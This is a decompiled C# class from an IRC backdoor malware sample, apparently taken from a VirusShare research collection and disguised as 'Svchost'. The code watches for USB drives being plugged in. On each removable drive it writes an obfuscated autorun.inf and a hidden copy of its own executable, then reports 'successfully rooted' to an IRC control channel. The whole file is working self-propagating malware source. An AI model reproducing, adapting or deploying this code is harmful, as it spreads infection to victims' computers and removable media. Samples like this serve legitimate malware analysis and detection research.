// Decompiled with JetBrains decompiler
// Type: myApp.Usb
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;

namespace myApp
{
  internal class Usb
  {
    private static ManagementEventWatcher Mew;

    public static void Listen()
    {
      ManagementScope scope = new ManagementScope("root\\CIMV2");
      scope.Options.EnablePrivileges = true;
      try
      {
        Usb.Mew = new ManagementEventWatcher(scope, (EventQuery) new WqlEventQuery()
        {
          EventClassName = "__InstanceCreationEvent",
          WithinInterval = new TimeSpan(0, 0, 3),
          Condition = "TargetInstance ISA 'Win32_USBControllerdevice'"
        });
        Usb.Mew.EventArrived += new EventArrivedEventHandler(Usb.foundU);
        Usb.Mew.Start();
      }
      catch
      {
        if (Usb.Mew == null)
          return;
        Usb.Mew.Stop();
      }
    }

    public static void foundU(object sender, EventArgs e)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.DriveType == DriveType.Removable)
        {
          try
          {
            if (File.Exists(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true)))
              File.Delete(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true));
            if (File.Exists(drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true)))
              File.Delete(drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true));
          }
          catch
          {
          }
          StreamWriter streamWriter = new StreamWriter(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true));
          streamWriter.WriteLine(Fuck.a("cLJ2c4jB2LWln+SqM1cmCQ==", Install.gay, true));
          streamWriter.WriteLine(Fuck.a("pbD3rv0mNI7aGEqhV/O5mg==", Install.gay, true));
          streamWriter.WriteLine(Fuck.a("open=autorun.exe", Install.gay, true));
          streamWriter.WriteLine(Fuck.a("MXpHRSVb4BZXu7p5GN47vFJyametJ7HS", Install.gay, true));
          streamWriter.WriteLine(Fuck.a("BoYd7eX5plbG53lTqF+wb+wappqQ80vb9qtoiv9t43g=", Install.gay, true));
          streamWriter.Close();
          File.SetAttributes(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true), File.GetAttributes(drive.Name + Fuck.a("xXCM76My1Dil9MGCDveKxA==", Install.gay, true)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
          try
          {
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true));
            File.SetAttributes(drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true), File.GetAttributes(drive.Name + Fuck.a("xXCM76My1DhN5ou5WBEokw==", Install.gay, true)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
            Program.Writer.WriteLine("PRIVMSG " + Program.CHANNEL + " :  " + drive.Name + " \u00039successfully rooted");
          }
          finally
          {
            Thread.Sleep(2000);
          }
        }
        if (Usb.Mew != null)
          Usb.Mew.Stop();
        Usb.Mew.Start();
      }
    }
  }
}
